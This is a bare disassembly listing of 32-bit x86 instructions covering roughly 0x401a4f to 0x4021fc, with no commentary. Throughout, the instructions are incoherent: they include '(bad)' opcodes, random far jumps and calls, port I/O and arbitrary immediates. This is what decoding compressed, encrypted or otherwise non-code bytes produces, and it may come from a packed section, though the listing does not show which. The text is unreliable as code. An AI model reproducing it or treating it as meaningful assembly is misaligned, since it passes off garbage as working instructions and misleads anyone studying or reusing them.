  401a4f:	jge    0x401aa8
  401a51:	adc    DWORD PTR [eax],esi
  401a53:	jmp    0x3bef20f9
  401a58:	adc    BYTE PTR [esp+eax*2],al
  401a5b:	jmp    0x401ad0
  401a5d:	cmc    
  401a5e:	jp     0x401a63
  401a60:	retf   
  401a61:	dec    ebx
  401a62:	out    dx,al
  401a63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a64:	pop    edx
  401a65:	arpl   WORD PTR [eax+0x1c],ax
  401a68:	out    dx,al
  401a69:	(bad)  
  401a6a:	jge    0x401a9f
  401a6c:	or     DWORD PTR [edx+0xf8e67d9],edx
  401a72:	in     eax,dx
  401a73:	push   0x8eacd8a3
  401a78:	xchg   DWORD PTR [ebp+eax*1-0x211057cb],ecx
  401a7f:	imul   edx,ecx,0x69291252
  401a85:	std    
  401a86:	mov    ebx,0x9b676b90
  401a8b:	sar    BYTE PTR [esi+0x564e75d7],0x56
  401a92:	icebp  
  401a93:	cmp    BYTE PTR [ecx+0x761c6bd0],ch
  401a99:	imul   esi,DWORD PTR gs:[ebp+0x3f],0x97557854
  401aa1:	lods   eax,DWORD PTR ds:[esi]
  401aa2:	neg    DWORD PTR [ebp+ebp*2+0x75]
  401aa6:	in     al,dx
  401aa7:	out    dx,eax
  401aa8:	ins    DWORD PTR es:[edi],dx
  401aa9:	mov    ds:0x5cbc8d45,eax
  401aae:	xor    BYTE PTR [ebx-0x61],0x61
  401ab2:	(bad)  
  401ab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ab4:	or     al,0x92
  401ab6:	test   DWORD PTR [esi],eax
  401ab8:	test   BYTE PTR [ebx],bh
  401aba:	cs jge 0x401a68
  401abd:	loope  0x401ab5
  401abf:	in     eax,0xbd
  401ac1:	mov    eax,0xa81b8ddd
  401ac6:	imul   edi,edx,0x86dcadf5
  401acc:	mov    al,ds:0xdb848965
  401ad1:	hlt    
  401ad2:	in     al,0xc6
  401ad4:	cmc    
  401ad5:	cld    
  401ad6:	jecxz  0x401b2d
  401ad8:	in     al,0x9
  401ada:	in     al,dx
  401adb:	sub    eax,0x733f081a
  401ae0:	mov    ds:0x4b1e9c3c,al
  401ae5:	aam    0xf5
  401ae7:	inc    edi
  401ae8:	ds out dx,eax
  401aea:	jmp    0x401aa7
  401aec:	les    ecx,FWORD PTR [eax]
  401aee:	and    BYTE PTR [ecx+edi*4+0x21],ah
  401af2:	jbe    0x401b2b
  401af4:	mov    ds:0x47b9fb48,al
  401af9:	repz rcl ecx,cl
  401afc:	cmp    edi,DWORD PTR [ebp-0x34fa096b]
  401b02:	int3   
  401b03:	jge    0x401ac0
  401b05:	jnp    0x401aab
  401b07:	mov    dl,0x7e
  401b09:	add    esp,DWORD PTR [edx+0x6d65236a]
  401b0f:	dec    esi
  401b10:	mov    eax,0x2435a1e9
  401b15:	sahf   
  401b16:	mov    ecx,0xe16abef6
  401b1b:	mov    cs,WORD PTR [eax+eiz*4]
  401b1e:	ficomp DWORD PTR [edi-0x6f]
  401b21:	ja     0x401aee
  401b23:	inc    ebx
  401b24:	add    bl,BYTE PTR [ecx+0x41]
  401b27:	fwait
  401b28:	je     0x401b6b
  401b2a:	loope  0x401b00
  401b2c:	adc    al,0xd5
  401b2e:	pushf  
  401b2f:	or     al,0x3
  401b31:	mov    al,0xc1
  401b33:	push   cs
  401b34:	hlt    
  401b35:	push   edx
  401b36:	inc    ebp
  401b37:	inc    ecx
  401b38:	in     al,dx
  401b39:	add    BYTE PTR ds:0x7d9c86de,dl
  401b3f:	pop    es
  401b40:	retf   
  401b41:	dec    ebp
  401b42:	ret    
  401b43:	jmp    0x41847d3d
  401b48:	jmp    0xecfe:0x440cf694
  401b4f:	xchg   edi,eax
  401b50:	cmp    ecx,DWORD PTR [edi+0x64]
  401b53:	inc    esp
  401b54:	add    DWORD PTR [edx],edx
  401b56:	or     BYTE PTR [esi-0x2],0x7f
  401b5a:	pop    ebp
  401b5b:	mov    edi,0xad181159
  401b60:	xchg   edx,eax
  401b61:	aam    0x63
  401b63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b64:	mov    ecx,0xd8e8087d
  401b69:	dec    esi
  401b6a:	pop    edi
  401b6b:	unpcklps xmm7,XMMWORD PTR [edi+0x6b6c10a1]
  401b72:	jmp    0x167f:0xa3147a2f
  401b79:	adc    bh,BYTE PTR [ebx+0x59]
  401b7c:	fadd   st,st(3)
  401b7e:	ja     0x401bfa
  401b80:	pushf  
  401b81:	mov    eax,ds:0x2b3e15a9
  401b86:	jmp    0xfcb4ef8d
  401b8b:	inc    esp
  401b8c:	adc    esp,ebx
  401b8e:	popf   
  401b8f:	lock repz inc esi
  401b92:	sub    al,dl
  401b94:	mov    WORD PTR gs:[ebx+0x3d],fs
  401b98:	int    0xca
  401b9a:	mov    al,0x2e
  401b9c:	retf   
  401b9d:	inc    ebx
  401b9e:	fsqrt  
  401ba0:	loopne 0x401be5
  401ba2:	inc    DWORD PTR [ebp-0xbd4c156]
  401ba8:	sbb    DWORD PTR [ecx+0x75],0xa6e67003
  401baf:	mov    edx,0x3de26754
  401bb4:	retf   0x5670
  401bb7:	adc    BYTE PTR [esi],0x76
  401bba:	sbb    DWORD PTR [eax],eax
  401bbc:	cs push esp
  401bbe:	ds push ebp
  401bc0:	ret    0xd393
  401bc3:	repz call 0x330e4929
  401bc9:	mov    ecx,DWORD PTR [esi-0x2f]
  401bcc:	dec    esi
  401bcd:	dec    ecx
  401bce:	ds pop edi
  401bd0:	sub    DWORD PTR [ebp+0x5f9e8b10],esp
  401bd6:	mov    dh,0x61
  401bd8:	fcom   QWORD PTR [ebp-0x84068cf]
  401bde:	mov    ds:0xbf7011df,al
  401be3:	mov    bl,cl
  401be5:	add    al,BYTE PTR [eax+ebx*8+0x24]
  401be9:	mov    esp,0x479054e2
  401bee:	sbb    esp,esi
  401bf0:	dec    esp
  401bf1:	retf   
  401bf2:	push   ebp
  401bf3:	xchg   edx,eax
  401bf4:	ret    
  401bf5:	pop    eax
  401bf6:	or     bh,ch
  401bf8:	cmp    ah,BYTE PTR ds:0xac51a488
  401bfe:	pop    ss
  401bff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c00:	pop    edx
  401c01:	popf   
  401c02:	test   al,0xe8
  401c04:	nop
  401c05:	retf   0x810f
  401c08:	pusha  
  401c09:	mov    edx,0x3640bfc6
  401c0e:	pop    es
  401c0f:	fs call 0x9ba299cd
  401c15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c16:	test   cl,dh
  401c18:	repz mov esp,0x5cfab3b3
  401c1e:	(bad)  
  401c1f:	dec    edi
  401c20:	js     0x401bf8
  401c22:	pop    esi
  401c23:	fist   WORD PTR [eax+eax*2]
  401c26:	sub    dh,BYTE PTR es:[esi-0x57a95160]
  401c2d:	pop    ebp
  401c2e:	pop    edi
  401c2f:	jge    0x401c57
  401c31:	scas   al,BYTE PTR es:[edi]
  401c32:	mov    dh,ch
  401c34:	xchg   DWORD PTR [esi-0x76],edi
  401c37:	pop    edx
  401c38:	sub    al,0x47
  401c3a:	add    BYTE PTR [ecx-0x4b],dh
  401c3d:	cmc    
  401c3e:	in     al,dx
  401c3f:	add    ch,BYTE PTR [ebp+0x8]
  401c42:	xchg   esi,eax
  401c43:	ficomp DWORD PTR [ebp-0x127d84d0]
  401c49:	repnz cmp eax,0x524d9ed7
  401c4f:	pop    esi
  401c50:	jmp    0x401bd2
  401c52:	repz fmul QWORD PTR [esi+eax*1]
  401c56:	fs fs dec ecx
  401c59:	test   BYTE PTR [ebp+0x634ded86],cl
  401c5f:	add    dl,BYTE PTR [ebx]
  401c61:	or     BYTE PTR [ecx],al
  401c63:	outs   dx,DWORD PTR ds:[esi]
  401c64:	sahf   
  401c65:	mov    ds:0x71a22741,eax
  401c6a:	add    dl,BYTE PTR [eax-0x60]
  401c6d:	mov    eax,DWORD PTR [ebp-0x2b]
  401c70:	inc    edx
  401c71:	push   cs
  401c72:	repz push es
  401c74:	or     al,0x48
  401c76:	xchg   esp,eax
  401c77:	fwait
  401c78:	sbb    DWORD PTR [edx],ebp
  401c7a:	add    ebp,DWORD PTR [edx-0x2e]
  401c7d:	dec    esp
  401c7e:	cwde   
  401c7f:	inc    edx
  401c80:	sbb    eax,0xe9578fed
  401c85:	or     BYTE PTR [edx+eiz*4-0x6c],al
  401c89:	fidiv  DWORD PTR [edx-0x3a]
  401c8c:	dec    esp
  401c8d:	pop    ebp
  401c8e:	push   ebp
  401c8f:	aam    0xb0
  401c91:	sar    DWORD PTR [ecx],0x84
  401c94:	cwde   
  401c95:	xor    bl,BYTE PTR [ecx]
  401c97:	aam    0x52
  401c99:	daa    
  401c9a:	xchg   esi,eax
  401c9b:	pop    ss
  401c9c:	mov    edx,0x6fe97b72
  401ca1:	and    DWORD PTR [esi-0x42f58be5],ebx
  401ca7:	lock mov bh,0x3d
  401caa:	stos   BYTE PTR es:[edi],al
  401cab:	sub    ebx,DWORD PTR [ebx+ecx*1-0x2]
  401caf:	test   BYTE PTR [edi+ebx*1+0x13],bl
  401cb3:	sub    al,0x1d
  401cb5:	push   eax
  401cb6:	and    ecx,ecx
  401cb8:	fdiv   DWORD PTR [esp+eax*4]
  401cbb:	jmp    0xf434171b
  401cc0:	and    dl,bl
  401cc2:	shr    DWORD PTR [esi+0x38974326],cl
  401cc8:	mov    ecx,es
  401cca:	xchg   BYTE PTR [ebp-0x3f576f4b],dh
  401cd0:	scas   al,BYTE PTR es:[edi]
  401cd1:	sbb    al,0x52
  401cd3:	xchg   ecx,eax
  401cd4:	xchg   esp,eax
  401cd5:	inc    edx
  401cd6:	and    cl,bh
  401cd8:	test   DWORD PTR [edx-0x6f],ebx
  401cdb:	or     ebp,DWORD PTR [ebx-0x189320a1]
  401ce1:	stos   BYTE PTR es:[edi],al
  401ce2:	jle    0x401ca6
  401ce4:	test   eax,0xdcf8a1af
  401ce9:	push   edx
  401cea:	stc    
  401ceb:	xchg   esi,edx
  401ced:	pop    edi
  401cee:	xor    DWORD PTR [eax+0x6236ec3e],ecx
  401cf4:	cli    
  401cf5:	mov    bl,0xba
  401cf7:	and    ebp,DWORD PTR [ebp+0x29]
  401cfa:	jmp    0x401d6c
  401cfc:	mov    DWORD PTR ds:0x9769a7bd,edx
  401d02:	mov    al,0xba
  401d04:	nop
  401d05:	outs   dx,BYTE PTR es:[esi]
  401d07:	shl    DWORD PTR [esi+0x33454c90],0x4
  401d0e:	fstp   TBYTE PTR [esi]
  401d10:	mov    ch,0x2
  401d12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d14:	and    edx,DWORD PTR [esi-0x29]
  401d17:	aas    
  401d18:	push   edi
  401d19:	sub    BYTE PTR [ebp-0x45],ah
  401d1c:	hlt    
  401d1d:	rcl    BYTE PTR [edi-0x22],cl
  401d20:	and    al,0xb3
  401d22:	add    ah,ah
  401d24:	(bad)  [eax]
  401d26:	popf   
  401d27:	push   esi
  401d28:	jno    0x401d43
  401d2a:	cmp    DWORD PTR [esi+0x24],ebp
  401d2d:	jne    0x401cd4
  401d2f:	aad    0xaa
  401d31:	mov    WORD PTR [edi],cs
  401d33:	lods   eax,DWORD PTR ds:[esi]
  401d34:	test   DWORD PTR [ebp-0x4a],ebp
  401d37:	xchg   DWORD PTR [ecx-0x37],ebx
  401d3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d3b:	aas    
  401d3c:	and    al,0x97
  401d3e:	sti    
  401d3f:	(bad)  
  401d40:	mov    edx,0x8dadf246
  401d45:	push   0x4d578eda
  401d4a:	jle    0x401cdc
  401d4c:	sub    ebp,DWORD PTR [ecx-0x30]
  401d4f:	pop    edx
  401d50:	push   esp
  401d51:	xlat   BYTE PTR ds:[ebx]
  401d52:	push   ebx
  401d53:	adc    DWORD PTR [ecx+0x6e543259],esp
  401d59:	xchg   esi,eax
  401d5a:	shl    BYTE PTR [ebp+eiz*8+0x59edb1ec],0xa6
  401d62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d63:	ins    BYTE PTR es:[edi],dx
  401d64:	push   ss
  401d65:	xlat   BYTE PTR ds:[ebx]
  401d66:	cdq    
  401d67:	dec    esp
  401d68:	inc    eax
  401d69:	stos   BYTE PTR es:[edi],al
  401d6a:	cld    
  401d6b:	jb     0x401d04
  401d6d:	test   BYTE PTR [esi-0x6cd2d6b7],ah
  401d73:	(bad)  
  401d74:	jmp    0x3f45:0x48ca42a9
  401d7b:	adc    ebx,ebp
  401d7d:	iret   
  401d7e:	xchg   edi,eax
  401d7f:	sbb    BYTE PTR [ebx+0x75],ch
  401d82:	cdq    
  401d83:	xchg   ebp,eax
  401d84:	in     eax,0x2c
  401d86:	add    ax,0x669a
  401d8a:	mov    bl,0x4d
  401d8c:	or     eax,0x1d115be9
  401d91:	sbb    cl,ch
  401d93:	jmp    0x401d95
  401d95:	mov    esp,0xac0de2e3
  401d9a:	ss loopne 0x401da9
  401d9d:	int    0x5d
  401d9f:	pop    eax
  401da0:	jg     0x401da5
  401da2:	push   0x18
  401da4:	mov    esp,DWORD PTR [edx+0x74102dc4]
  401daa:	dec    edx
  401dab:	pushf  
  401dac:	mov    ebx,0xee9d632
  401db1:	ficomp DWORD PTR [eax-0x2099643f]
  401db7:	push   ss
  401db8:	inc    esi
  401db9:	jmp    0x66d6:0x691d18fe
  401dc0:	cmp    eax,0x1c92e675
  401dc5:	inc    ebp
  401dc6:	ins    DWORD PTR es:[edi],dx
  401dc7:	les    edi,FWORD PTR ds:0x68907665
  401dcd:	jno    0x401d6b
  401dcf:	cld    
  401dd0:	hlt    
  401dd1:	jns    0x401d68
  401dd3:	je     0x401d9b
  401dd5:	jmp    0xa0faa0fd
  401dda:	(bad)  
  401ddc:	gs (bad) 
  401dde:	cld    
  401ddf:	in     al,dx
  401de0:	jp     0x401d90
  401de2:	scas   al,BYTE PTR es:[edi]
  401de3:	mov    cl,0xf7
  401de5:	dec    esi
  401de6:	ss aam 0x76
  401de9:	jl     0x401e3f
  401deb:	mov    ah,0x7a
  401ded:	jecxz  0x401df4
  401def:	jp     0x401dc3
  401df1:	retf   
  401df2:	push   ss
  401df3:	addr16 (bad) 
  401df5:	jge    0x401e3f
  401df7:	push   cs
  401df8:	ins    BYTE PTR es:[edi],dx
  401df9:	imul   ebx,edx,0x6593bfb6
  401dff:	pop    ecx
  401e00:	lea    ebp,[edx-0x3f82aabc]
  401e06:	or     ecx,DWORD PTR ds:0x9fc99445
  401e0c:	mov    ch,0x5b
  401e0e:	mov    esi,0xea529790
  401e13:	ds pusha 
  401e15:	push   ss
  401e16:	fcomp  QWORD PTR [ecx]
  401e18:	pop    ebx
  401e19:	mov    ds:0xca07dce1,eax
  401e1e:	xchg   edi,eax
  401e1f:	sbb    al,0x3b
  401e21:	inc    edx
  401e22:	cld    
  401e23:	push   0x85f1b01f
  401e28:	stos   DWORD PTR es:[edi],eax
  401e29:	jl     0x401e8c
  401e2b:	sub    DWORD PTR [ebx+0x4b],edi
  401e2e:	out    0x12,eax
  401e30:	call   0xee304a96
  401e35:	aam    0x54
  401e37:	jo     0x401e71
  401e39:	stc    
  401e3a:	xor    edi,esp
  401e3c:	pop    ds
  401e3d:	sbb    ebx,DWORD PTR [edx+esi*8+0x67413018]
  401e44:	dec    eax
  401e45:	ror    BYTE PTR [ecx-0x47f351d7],1
  401e4b:	fistp  QWORD PTR [esi+0x4eeb90e6]
  401e51:	mov    ds:0x145a5473,al
  401e56:	sti    
  401e57:	push   edx
  401e58:	cdq    
  401e59:	ror    DWORD PTR [ebp+0x4d830482],cl
  401e5f:	in     al,0x32
  401e61:	jl     0x401ee1
  401e63:	jmp    0xad89d691
  401e68:	jle    0x401e02
  401e6a:	popa   
  401e6b:	ret    
  401e6c:	jl     0x401e71
  401e6e:	popa   
  401e6f:	and    al,bl
  401e71:	inc    ecx
  401e72:	loopne 0x401e28
  401e74:	sub    ah,BYTE PTR [ebx+edi*8-0x25]
  401e78:	push   0x5a819a41
  401e7d:	xchg   esi,eax
  401e7e:	(bad)  
  401e7f:	sbb    ebx,ebx
  401e81:	add    esi,DWORD PTR [ecx+0xe67573e]
  401e87:	ins    BYTE PTR es:[edi],dx
  401e88:	loopne 0x401e4e
  401e8a:	lock xor DWORD PTR ds:0xc5c0c0fb,eax
  401e91:	rol    DWORD PTR [eax],0x8c
  401e94:	inc    ecx
  401e95:	aad    0xb
  401e97:	xor    al,BYTE PTR [edx+0x5b9d661c]
  401e9d:	push   cs
  401e9e:	ret    
  401e9f:	nop
  401ea0:	cmp    eax,0x201a90d3
  401ea5:	sub    esi,DWORD PTR [edi+eiz*1]
  401ea8:	mov    dl,0xa3
  401eaa:	ins    BYTE PTR es:[edi],dx
  401eab:	mov    dl,0xd0
  401ead:	retf   
  401eae:	std    
  401eaf:	xchg   BYTE PTR [esi-0x70f6667a],cl
  401eb5:	faddp  st(6),st
  401eb7:	mov    ch,dh
  401eb9:	pop    ecx
  401eba:	aaa    
  401ebb:	jecxz  0x401e46
  401ebd:	fimul  WORD PTR [esp+ebp*1]
  401ec0:	out    0x78,al
  401ec2:	enter  0x830c,0xd8
  401ec6:	icebp  
  401ec7:	cmp    al,BYTE PTR [esi]
  401ec9:	ins    DWORD PTR es:[edi],dx
  401eca:	ss jno 0x401e61
  401ecd:	sahf   
  401ece:	pushf  
  401ecf:	cmc    
  401ed0:	and    al,0x2d
  401ed2:	aas    
  401ed3:	inc    edi
  401ed4:	lds    ebx,FWORD PTR [ebx-0x69fd5001]
  401eda:	pop    ds
  401edb:	pop    ds
  401edc:	sbb    bl,BYTE PTR [ebp-0x36949eb5]
  401ee2:	lock stos BYTE PTR es:[edi],al
  401ee4:	call   0xe36b0b2c
  401ee9:	ins    DWORD PTR es:[edi],dx
  401eea:	cli    
  401eeb:	or     BYTE PTR [edi-0x38],bl
  401eee:	int    0xd8
  401ef0:	test   ah,ch
  401ef2:	ins    BYTE PTR es:[edi],dx
  401ef3:	push   ds
  401ef4:	ins    DWORD PTR es:[edi],dx
  401ef5:	les    edx,FWORD PTR [ecx]
  401ef7:	cmp    eax,0x5d864423
  401efc:	adc    ebp,DWORD PTR [ecx+0xb3344b4]
  401f02:	mov    eax,ds:0x461815b
  401f07:	push   eax
  401f08:	and    BYTE PTR [ecx-0x47f927bb],bh
  401f0e:	out    dx,al
  401f0f:	outs   dx,BYTE PTR ds:[esi]
  401f10:	dec    esi
  401f11:	mov    eax,ds:0x7031753e
  401f16:	loop   0x401f01
  401f18:	mov    dh,0x5f
  401f1a:	dec    ecx
  401f1b:	test   BYTE PTR ds:0xf4f0f04b,dl
  401f21:	pop    edx
  401f22:	jmp    0x395ae0f3
  401f27:	jecxz  0x401f80
  401f29:	cmp    al,BYTE PTR [edx-0x3a]
  401f2c:	pop    esi
  401f2d:	lea    bp,[eax]
  401f30:	lock je 0x401f82
  401f33:	test   al,0x57
  401f35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f36:	or     esp,DWORD PTR [edx]
  401f38:	add    al,BYTE PTR [edi+ecx*8]
  401f3b:	or     eax,esp
  401f3d:	lock jae 0x401f63
  401f40:	xchg   ebx,eax
  401f41:	adc    DWORD PTR cs:[ecx+0x3c1c6714],edx
  401f48:	dec    ebp
  401f49:	pop    esp
  401f4a:	add    BYTE PTR [ecx+0x29],0x1d
  401f4e:	loopne 0x401f05
  401f50:	aad    0xbe
  401f52:	mov    al,0x4d
  401f54:	leave  
  401f55:	popa   
  401f56:	dec    edx
  401f57:	pop    ss
  401f58:	sub    bl,BYTE PTR [eax-0x38f0cb65]
  401f5e:	mov    ds,eax
  401f60:	loope  0x401fce
  401f62:	and    eax,DWORD PTR [ebx+0x69]
  401f65:	add    DWORD PTR [ecx],esi
  401f67:	ret    
  401f68:	lds    ecx,FWORD PTR [eax]
  401f6a:	dec    edi
  401f6b:	dec    ebx
  401f6c:	(bad)  
  401f6e:	push   ecx
  401f6f:	jmp    0xbe74:0xb6dc329c
  401f76:	xchg   edi,eax
  401f77:	out    dx,eax
  401f78:	imul   ebx,edx,0x50
  401f7b:	sbb    esp,DWORD PTR [eax-0x5c60417a]
  401f81:	not    ebp
  401f83:	out    0xe5,al
  401f85:	add    DWORD PTR [ebx+0x563d3d45],0xffffffa4
  401f8c:	jg     0x401f35
  401f8e:	sbb    eax,0x110cc214
  401f93:	imul   BYTE PTR [ebx+0x45a4e18f]
  401f99:	push   ecx
  401f9a:	pop    ecx
  401f9b:	dec    ecx
  401f9c:	sub    al,0x59
  401f9e:	dec    esi
  401f9f:	ins    BYTE PTR es:[edi],dx
  401fa0:	jecxz  0x401f4a
  401fa2:	push   0x3eddbaa9
  401fa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fa8:	jb     0x401fc1
  401faa:	adc    BYTE PTR [ebp+edx*8+0x2cfaa57c],al
  401fb1:	mov    dh,dh
  401fb3:	xchg   esi,eax
  401fb4:	add    eax,0x497b8e9
  401fb9:	mov    al,ds:0xa180e
  401fbe:	jmp    0x8f65238a
  401fc3:	inc    esi
  401fc4:	outs   dx,DWORD PTR ds:[esi]
  401fc5:	xor    BYTE PTR [ebx+ecx*4-0x5d1949e4],0x5f
  401fcd:	inc    ebp
  401fce:	push   ds
  401fcf:	std    
  401fd0:	ret    
  401fd1:	aaa    
  401fd2:	call   0xdaf6:0xb7175e1f
  401fd9:	bnd jge 0x402030
  401fdc:	add    DWORD PTR [edx+ebx*4-0x64313faf],0x73fec170
  401fe7:	cs dec edx
  401fe9:	(bad)  
  401fea:	les    edi,FWORD PTR [edi-0x12bc9898]
  401ff0:	pop    ebp
  401ff1:	push   es
  401ff2:	pushf  
  401ff3:	push   es
  401ff4:	sbb    esi,edi
  401ff6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ff7:	pop    edi
  401ff8:	push   ecx
  401ff9:	lock test eax,0x6b870a50
  401fff:	lea    edx,[edx+0x3f]
  402002:	jecxz  0x401faf
  402004:	je     0x401fd2
  402006:	pop    ecx
  402007:	je     0x40206c
  402009:	sbb    edi,DWORD PTR [ebp-0x5b4d5568]
  40200f:	out    0xd9,eax
  402011:	adc    dh,0x81
  402014:	sub    DWORD PTR [edx+0x42],0xffffffc1
  402018:	loopne 0x401fc1
  40201a:	dec    eax
  40201b:	repnz gs push ecx
  40201e:	lahf   
  40201f:	sbb    esi,esp
  402021:	push   es
  402022:	es scas eax,DWORD PTR es:[edi]
  402024:	add    al,bl
  402026:	jmp    0x84d75dea
  40202b:	push   eax
  40202c:	mov    dh,0x7d
  40202e:	cmc    
  40202f:	pop    ss
  402030:	mov    ecx,0xccc499cd
  402035:	xchg   ebx,eax
  402036:	pop    es
  402037:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402038:	rcr    BYTE PTR [esi],0xb6
  40203b:	iret   
  40203c:	jecxz  0x402080
  40203e:	or     ecx,eax
  402040:	popf   
  402041:	inc    eax
  402042:	cli    
  402043:	cmp    eax,DWORD PTR [edx]
  402045:	aam    0x0
  402047:	in     al,dx
  402048:	adc    cl,cl
  40204a:	outs   dx,DWORD PTR ds:[esi]
  40204b:	sti    
  40204c:	(bad)  
  40204d:	and    ebx,esi
  40204f:	fs xchg ebp,eax
  402051:	in     al,0x79
  402053:	mov    bh,0x1c
  402055:	sub    ebp,DWORD PTR [edi+0x47]
  402058:	icebp  
  402059:	inc    ebp
  40205a:	adc    dl,BYTE PTR [edx]
  40205c:	cli    
  40205d:	stos   BYTE PTR es:[edi],al
  40205e:	mov    edx,0xed1bdbaa
  402063:	fldenv [eax-0x76]
  402066:	add    ah,al
  402068:	pop    es
  402069:	push   ecx
  40206a:	test   eax,0x94adb8da
  40206f:	lock sub esi,esp
  402072:	xor    eax,0x3c1cbea4
  402077:	int    0xcb
  402079:	lods   al,BYTE PTR ds:[esi]
  40207a:	fcompp 
  40207c:	arpl   WORD PTR [ecx+0x8f726e6],bp
  402082:	aam    0xf6
  402084:	int3   
  402085:	les    ebx,FWORD PTR [ecx]
  402087:	inc    edi
  402088:	sbb    BYTE PTR [ebp+0x101bbce6],cl
  40208e:	pop    es
  40208f:	pop    esp
  402090:	je     0x402023
  402092:	inc    eax
  402093:	fwait
  402094:	arpl   bx,si
  402096:	xor    esp,DWORD PTR [edx-0x385d52b]
  40209c:	call   0x27301162
  4020a1:	pop    edx
  4020a2:	ret    0xbae8
  4020a5:	jp     0x4020c7
  4020a7:	in     al,dx
  4020a8:	clc    
  4020a9:	xor    BYTE PTR [esi+ecx*8+0x4473da6],ch
  4020b0:	or     DWORD PTR gs:[edx-0x29],edx
  4020b4:	imul   ecx,edx,0xffffffe9
  4020b7:	lea    ebx,[ebx]
  4020b9:	sbb    eax,0xfbaea540
  4020be:	inc    ebp
  4020bf:	mov    eax,0x14f0f627
  4020c4:	test   al,0xc
  4020c7:	daa    
  4020c8:	nop
  4020c9:	inc    ebp
  4020ca:	loopne 0x4020bd
  4020cc:	pop    ebp
  4020cd:	sbb    BYTE PTR [edx],0xe6
  4020d0:	les    edx,FWORD PTR [edx]
  4020d2:	sbb    cl,BYTE PTR [eax-0x63f36e91]
  4020d8:	ins    BYTE PTR es:[edi],dx
  4020d9:	cwde   
  4020da:	push   ss
  4020db:	inc    eax
  4020dc:	je     0x4020c5
  4020de:	stos   DWORD PTR es:[edi],eax
  4020df:	(bad)  
  4020e0:	jmp    0x402094
  4020e2:	or     cl,dh
  4020e4:	(bad)  
  4020e5:	xchg   ebx,eax
  4020e6:	mov    al,ds:0xb10247e
  4020eb:	out    dx,eax
  4020ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020ed:	cmp    BYTE PTR [esi-0x39],ch
  4020f0:	adc    al,0x67
  4020f2:	jnp    0x4020b7
  4020f4:	inc    ebx
  4020f5:	mov    cl,BYTE PTR [ebp+eiz*2-0x36]
  4020f9:	xor    al,0x6
  4020fb:	inc    ecx
  4020fc:	das    
  4020fd:	cmp    DWORD PTR [eax+ecx*2-0x7982120e],esi
  402104:	sub    BYTE PTR [edx-0x23],cl
  402107:	jo     0x402144
  402109:	in     eax,dx
  40210a:	push   eax
  40210b:	imul   ebx,DWORD PTR ds:0x590ba2ee,0x7c
  402112:	arpl   cx,dx
  402114:	outs   dx,DWORD PTR ds:[esi]
  402115:	enter  0x2ceb,0x2e
  402119:	jp     0x402192
  40211b:	xchg   ebp,ecx
  40211d:	xchg   esi,eax
  40211e:	aam    0x35
  402120:	rcr    ebp,1
  402122:	jmp    0x553a:0xd7459c86
  402129:	inc    esp
  40212a:	mov    cl,0xdc
  40212c:	mov    bl,0x89
  40212e:	and    al,BYTE PTR [edx+0x5a]
  402131:	icebp  
  402132:	ret    0xd606
  402135:	jb     0x402127
  402137:	pop    ebp
  402138:	icebp  
  402139:	push   ds
  40213a:	cdq    
  40213b:	out    dx,al
  40213c:	(bad)  
  40213d:	das    
  40213e:	dec    eax
  40213f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402140:	sub    al,0x6f
  402142:	lock fsub QWORD PTR [esi]
  402145:	pop    edx
  402146:	das    
  402147:	scas   eax,DWORD PTR es:[edi]
  402148:	mov    BYTE PTR [esi+edx*1-0x4aa77a03],bh
  40214f:	or     ebp,DWORD PTR [ebx-0x7e80cacc]
  402155:	cmp    al,0xb8
  402157:	push   ds
  402158:	push   cs
  402159:	nop
  40215a:	cmp    BYTE PTR [edi-0x2],ah
  40215d:	xor    eax,0xa3d775a5
  402162:	adc    BYTE PTR [edi+edx*8-0x52],al
  402166:	mov    al,ds:0x6e25baa8
  40216b:	pusha  
  40216c:	dec    esp
  40216d:	add    al,0xe
  40216f:	inc    edx
  402170:	adc    dh,al
  402172:	push   0x7b
  402174:	cmp    eax,0x45a57117
  402179:	call   0x180c76a5
  40217e:	adc    al,0x7f
  402180:	cmp    eax,0x97476f35
  402185:	test   al,0xa4
  402187:	push   ds
  402188:	xchg   esi,eax
  402189:	xor    DWORD PTR [ebp+0x11062820],ebx
  40218f:	xchg   esi,eax
  402190:	mov    bl,al
  402192:	cli    
  402193:	jle    0x402207
  402195:	jmp    0xea74:0x2424e92e
  40219c:	cmp    DWORD PTR [eax+0x56],0x2f9f959a
  4021a3:	lahf   
  4021a4:	mov    al,0xf4
  4021a7:	sbb    cl,BYTE PTR ds:0xeca275ba
  4021ad:	jle    0x402186
  4021af:	mov    ebp,0xdb53056b
  4021b4:	adc    DWORD PTR [edx+0x6f6b7821],ebp
  4021ba:	fld    TBYTE PTR [ebx]
  4021bc:	fiadd  DWORD PTR [esi+ebx*1-0x36]
  4021c0:	cmp    DWORD PTR [edx+0x1],eax
  4021c3:	jnp    0x40218c
  4021c5:	pop    esi
  4021c6:	pop    esi
  4021c7:	jnp    0x40214d
  4021c9:	in     al,dx
  4021ca:	mov    ecx,0x431f7d3f
  4021cf:	xchg   ecx,eax
  4021d0:	pop    ebx
  4021d1:	(bad)  
  4021d2:	or     al,0xe5
  4021d4:	mov    es,WORD PTR [ebx-0xc]
  4021d7:	mov    dl,0xfd
  4021d9:	mov    esp,0x1e88b689
  4021de:	inc    ecx
  4021df:	pop    eax
  4021e0:	pandn  mm1,mm3
  4021e3:	mov    ds:0x9294992a,al
  4021e8:	ins    DWORD PTR es:[edi],dx
  4021e9:	call   0x3e99:0x10d1301d
  4021f0:	std    
  4021f1:	push   ecx
  4021f2:	cwde   
  4021f3:	stc    
  4021f4:	sub    ah,BYTE PTR [ecx+0x55]
  4021f7:	stc    
  4021f8:	in     eax,dx
  4021f9:	std    
  4021fa:	aam    0xb8
  4021fc:	jae    0x402252
